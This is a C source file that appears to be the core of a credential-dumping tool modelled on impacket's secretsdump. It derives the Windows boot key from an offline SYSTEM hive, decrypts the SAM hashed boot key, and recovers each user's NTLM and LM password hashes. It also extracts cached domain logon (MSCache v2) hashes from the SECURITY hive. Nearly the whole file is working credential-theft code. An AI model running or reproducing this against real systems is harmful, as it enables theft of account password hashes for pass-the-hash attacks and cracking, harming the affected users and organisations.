// plan2_sam.c — SAM/LSA/MSCache credential parsing from offline hives (Plan 2 core)
// All offsets & crypto flow verified against impacket secretsdump:
//   getBootKey: Lsa\{JD,Skew1,GBG,Data} key CLASS strings -> hex -> permute
//   getHBootKey: SAM\Domains\Account\F Key0@0x68, rev 0x02 = SAM_KEY_DATA_AES (AES-128-CBC),
//                rev 0x01 legacy RC4 (MD5(Salt+QWERTY+bootKey+DIGITS))
//   USER_ACCOUNT_V: 0xCC header, Name@0x0C/0x10, LMHash@0x9C/0xA0, NTHash@0xA8/0xAC,
//                offsets relative to Data start; SAM_HASH_AES record: Salt@8, Hash@24;
//                legacy SAM_HASH: Hash@4 (rev byte rec[2]==0x01); DES layers per 2.2.11.1.3
#include "plan2_sam.h"

// SysKey permutation table
static const BYTE g_SysKeyPerm[16] = {
    0x08,0x05,0x04,0x02,0x0B,0x09,0x0D,0x03,0x00,0x06,0x01,0x0C,0x0E,0x0A,0x0F,0x07
};

static BYTE HexNib(WCHAR c) {
    if (c >= L'0' && c <= L'9') return (BYTE)(c - L'0');
    if (c >= L'a' && c <= L'f') return (BYTE)(c - L'a' + 10);
    if (c >= L'A' && c <= L'F') return (BYTE)(c - L'A' + 10);
    return 0;
}

// ─── Extract BootKey from SYSTEM hive (mirrors impacket local getBootKey) ───
// JD/Skew1/GBG/Data are the CLASS STRINGS of subkeys under ControlSetNNN\Control\Lsa,
// stored as UTF-16LE hex text. First 8 hex chars of each class = 4 bytes of material,
// concatenated (16 bytes) then permuted with the standard SysKey permutation table.
BOOL Plan2ExtractSysKey(HIVE_DATA* sys, BYTE bootKey[16]) {
    if (!HiveInit(sys)) {
        wprintf(L"      [i] SYSTEM buffer is not a valid hive (no regf)\n");
        return FALSE;
    }

    // Resolve CurrentControlSet via SYSTEM\Select\Current
    PBYTE sel = NULL; DWORD selSz = 0;
    if (!HiveGetValueByPath(sys, L"Select", L"Current", &sel, &selSz) || selSz < 4) {
        if (sel) free(sel);
        wprintf(L"      [i] Select\\Current NOT FOUND\n");
        return FALSE;
    }
    DWORD ccs = *(PDWORD)sel; free(sel);
    if (ccs < 1 || ccs > 999) {
        wprintf(L"      [i] Select\\Current invalid (%u)\n", ccs);
        return FALSE;
    }
    wprintf(L"      [i] CurrentControlSet = %u\n", ccs);

    static const WCHAR* names[4] = { L"JD", L"Skew1", L"GBG", L"Data" };
    BYTE raw[16]; DWORD off = 0;

    for (int i = 0; i < 4; i++) {
        WCHAR path[256];
        swprintf_s(path, 256, L"ControlSet%03u\\Control\\Lsa\\%s", ccs, names[i]);

        PBYTE cls = NULL; DWORD cl = 0;
        if (!HiveGetClassByPath(sys, path, &cls, &cl) || cl < 16) {
            if (cls) free(cls);
            wprintf(L"      [i] %s: class NOT FOUND\n", names[i]);
            return FALSE;
        }
        // class data is UTF-16LE hex text: each hex char is 2 bytes (odd byte = 0x00).
        // Take the 8 chars at byte offsets 0,2,4,...,14 → 4 bytes (impacket ans[:16]).
        for (int j = 0; j < 16; j += 4)
            raw[off++] = (BYTE)((HexNib((WCHAR)cls[j]) << 4) | HexNib((WCHAR)cls[j + 2]));
        free(cls);
    }

    for (int i = 0; i < 16; i++) bootKey[i] = raw[g_SysKeyPerm[i]];
    return TRUE;
}

// ─── hashedBootKey: SAM\Domains\Account\F → Key0 @0x68 → SAM_KEY_DATA_AES (rev 0x02) ───
//                → AES-128-CBC decrypt with bootKey, IV=Salt
BOOL Plan2GetHashedBootKey(HIVE_DATA* sam, const BYTE bootKey[16], BYTE hbk[48]) {
    PBYTE f = NULL; DWORD fLen = 0;
    if (!HiveGetValueByPath(sam, L"SAM\\Domains\\Account", L"F", &f, &fLen) || fLen < 0x68 + 32 + 16) {
        if (f) free(f);
        return FALSE;
    }
    PBYTE key0 = f + 0x68;

    if (key0[0] == 0x02) {
        // SAM_KEY_DATA_AES: Revision(4) Length(4) CheckSumLen(4) DataLen(4) Salt(16) Data[]
        DWORD dataLen = *(PDWORD)(key0 + 12);
        if (dataLen == 0 || dataLen > fLen - 0x68 - 32 || dataLen > 48) { free(f); return FALSE; }
        aes128_cbc_decrypt(bootKey, key0 + 16, key0 + 32, dataLen, hbk);
        free(f);
        return TRUE;
    }
    if (key0[0] == 0x01) {
        // Legacy SAM_KEY_DATA: Revision(4) Length(4) Salt(16) Key(16) CheckSum(16)
        // rc4Key = MD5(Salt + QWERTY + bootKey + DIGITS)
        static const BYTE QWERTY[48] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%"; // 47 + NUL
        static const BYTE DIGITS[41] = "0123456789012345678901234567890123456789";     // 40 + NUL
        BYTE md5In[16 + 48 + 16 + 41];
        memcpy(md5In, key0 + 8, 16);        // Salt
        memcpy(md5In + 16, QWERTY, 48);
        memcpy(md5In + 64, bootKey, 16);
        memcpy(md5In + 80, DIGITS, 41);
        BYTE rc4Key[16];
        md5(md5In, sizeof(md5In), rc4Key);
        rc4(rc4Key, 16, key0 + 24, 32, hbk); // Key + CheckSum
        free(f);
        return TRUE;
    }
    free(f);
    return FALSE;
}

// ─── Parse SAM users: SAM\Domains\Account\Users\<RID-hex>\V ───
// Per user: USER_ACCOUNT_V header (0xCC) + Data
//   → SAM_HASH_AES record (newStyle) → AES-128-CBC(hbk, Salt) → DES layers (Key1/Key2 from RID)
//   → legacy SAM_HASH (rec[2]==0x01) → rc4(MD5(hbk[:16]+RID_le+constant)) → DES layers
DWORD Plan2ParseSAM(HIVE_DATA* sam, const BYTE bootKey[16], NTLM_CRED** out) {
    *out = NULL;
    if (!HiveInit(sam)) return 0;

    BYTE hbk[48] = {0};
    if (!Plan2GetHashedBootKey(sam, bootKey, hbk)) return 0;

    PWSTR subkeys[512] = {0};
    DWORD nUsers = HiveEnumSubkeys(sam, L"SAM\\Domains\\Account\\Users", subkeys, 512);

    DWORD cap = 64, cnt = 0;
    *out = (NTLM_CRED*)calloc(cap, sizeof(NTLM_CRED));
    if (!*out) {
        for (DWORD i = 0; i < nUsers; i++) free(subkeys[i]);
        return 0;
    }

    for (DWORD u = 0; u < nUsers; u++) {
        // RID = subkey name (8 hex chars)
        if (!subkeys[u] || wcslen(subkeys[u]) != 8) continue;
        DWORD rid = 0; BOOL okHex = TRUE;
        for (int i = 0; i < 8; i++) {
            WCHAR ch = subkeys[u][i];
            int v;
            if (ch >= L'0' && ch <= L'9') v = ch - L'0';
            else if (ch >= L'a' && ch <= L'f') v = ch - L'a' + 10;
            else if (ch >= L'A' && ch <= L'F') v = ch - L'A' + 10;
            else { okHex = FALSE; break; }
            rid = (rid << 4) | (DWORD)v;
        }
        if (!okHex) continue;

        WCHAR vpath[512];
        swprintf_s(vpath, 512, L"SAM\\Domains\\Account\\Users\\%s", subkeys[u]);
        PBYTE v = NULL; DWORD vLen = 0;
        if (!HiveGetValueByPath(sam, vpath, L"V", &v, &vLen) || vLen < 0xCC + 24) {
            if (v) free(v);
            continue;
        }

        // USER_ACCOUNT_V: 0xCC-byte header, offsets relative to Data start
        PBYTE data = v + 0xCC;
        DWORD dataLen = vLen - 0xCC;
        DWORD ntOff = *(PDWORD)(v + 0xA8), ntLen = *(PDWORD)(v + 0xAC);
        DWORD lmOff = *(PDWORD)(v + 0x9C), lmLen = *(PDWORD)(v + 0xA0);
        DWORD nameOff = *(PDWORD)(v + 0x0C), nameLen = *(PDWORD)(v + 0x10);
        if (ntOff + 20 > dataLen || ntLen < 16) { free(v); continue; }

        BYTE ntRaw[16] = {0}, lmRaw[16] = {0};

        // NT hash
        PBYTE rec = data + ntOff;
        BOOL newStyle = (ntLen != 20 || rec[2] != 0x01);
        if (newStyle && ntLen >= 40 && ntOff + 40 <= dataLen) {
            aes128_cbc_decrypt(hbk, rec + 8, rec + 24, 16, ntRaw); // SAM_HASH_AES: Salt@8, enc@24
        } else if (!newStyle) {
            // Legacy SAM_HASH: rc4Key = MD5(hbk[:16] + RID_le + constant)
            BYTE md5In[16 + 4 + 11];
            memcpy(md5In, hbk, 16);
            md5In[16] = (BYTE)rid; md5In[17] = (BYTE)(rid >> 8);
            md5In[18] = (BYTE)(rid >> 16); md5In[19] = (BYTE)(rid >> 24);
            memcpy(md5In + 20, "NTPASSWORD\0", 11);
            BYTE rc4Key[16];
            md5(md5In, 31, rc4Key);
            rc4(rc4Key, 16, rec + 4, 16, ntRaw); // SAM_HASH: Hash@4
        } else { free(v); continue; }

        // LM hash (empty on modern systems — LM disabled)
        if (lmOff + 20 <= dataLen && lmLen >= 16) {
            PBYTE lrec = data + lmOff;
            BOOL lmNew = (lmLen != 20 || lrec[2] != 0x01);
            if (lmNew && lmLen >= 40 && lmOff + 40 <= dataLen) {
                aes128_cbc_decrypt(hbk, lrec + 8, lrec + 24, 16, lmRaw);
            } else if (!lmNew) {
                BYTE md5In[16 + 4 + 11];
                memcpy(md5In, hbk, 16);
                md5In[16] = (BYTE)rid; md5In[17] = (BYTE)(rid >> 8);
                md5In[18] = (BYTE)(rid >> 16); md5In[19] = (BYTE)(rid >> 24);
                memcpy(md5In + 20, "LMPASSWORD\0", 11);
                BYTE rc4Key[16];
                md5(md5In, 31, rc4Key);
                rc4(rc4Key, 16, lrec + 4, 16, lmRaw);
            }
        }

        // DES layers (both styles): hash = DES(K1, key[0:8]) + DES(K2, key[8:16])
        BYTE k1[8], k2[8], fin[16];
        sam_derive_des_keys(rid, k1, k2);
        des_decrypt_block(k1, ntRaw, fin);
        des_decrypt_block(k2, ntRaw + 8, fin + 8);
        memcpy(ntRaw, fin, 16);
        if (lmOff + 20 <= dataLen) {
            des_decrypt_block(k1, lmRaw, fin);
            des_decrypt_block(k2, lmRaw + 8, fin + 8);
            memcpy(lmRaw, fin, 16);
        }

        if (cnt >= cap) { cap *= 2; *out = (NTLM_CRED*)realloc(*out, cap * sizeof(NTLM_CRED)); }
        NTLM_CRED* c = &(*out)[cnt];
        c->rid = rid;
        memcpy(c->ntlm, ntRaw, 16);
        memcpy(c->lm, lmRaw, 16);
        DWORD nmax = min(nameLen, 254);
        if (nameOff + nmax <= dataLen && nmax >= 2) {
            memcpy(c->name, data + nameOff, nmax);
            c->name[nmax / 2] = 0;
        } else {
            swprintf_s(c->name, 128, L"User_%u", rid);
        }
        cnt++;
        free(v);
    }

    for (DWORD i = 0; i < nUsers; i++) free(subkeys[i]);
    return cnt;
}

// ─── Parse SECURITY: MSCache v2 entries (raw NL$ values under Cache key) ───
DWORD Plan2ParseMSCache(HIVE_DATA* sec, WCHAR*** names, WCHAR*** domains, PBYTE** hashes) {
    DWORD cap = 32, cnt = 0;
    *names = (WCHAR**)calloc(cap, sizeof(WCHAR*));
    *domains = (WCHAR**)calloc(cap, sizeof(WCHAR*));
    *hashes = (PBYTE*)calloc(cap, sizeof(PBYTE));
    if (!*names || !*domains || !*hashes) return 0;
    if (!HiveInit(sec)) return 0;

    WCHAR vn[16];
    for (int n = 1; n <= 100; n++) {
        swprintf_s(vn, 16, L"NL$%d", n);
        PBYTE d = NULL; DWORD s = 0;
        if (!HiveGetValueByPath(sec, L"Cache", vn, &d, &s) || s < 0x80) { if (d) free(d); continue; }

        if (cnt >= cap) {
            cap *= 2; *names = (WCHAR**)realloc(*names, cap * sizeof(WCHAR*));
            *domains = (WCHAR**)realloc(*domains, cap * sizeof(WCHAR*));
            *hashes = (PBYTE*)realloc(*hashes, cap * sizeof(PBYTE));
        }

        (*hashes)[cnt] = (PBYTE)malloc(16);
        memcpy((*hashes)[cnt], d + 0x60, 16);

        PWSTR uname = (PWSTR)(d + 0x70);
        DWORD ul = 0; while (uname[ul] && ul < 127 && (PBYTE)(uname + ul) < d + s) ul++;
        (*names)[cnt] = (WCHAR*)malloc((ul + 1) * 2);
        memcpy((*names)[cnt], uname, ul * 2); (*names)[cnt][ul] = 0;

        PWSTR dom = (PWSTR)(d + 0x70 + (ul + 1) * 2);
        DWORD dl = 0; while (dom[dl] && dl < 127 && (PBYTE)(dom + dl) < d + s) dl++;
        (*domains)[cnt] = (WCHAR*)malloc((dl + 1) * 2);
        memcpy((*domains)[cnt], dom, dl * 2); (*domains)[cnt][dl] = 0;

        cnt++; free(d);
    }
    return cnt;
}
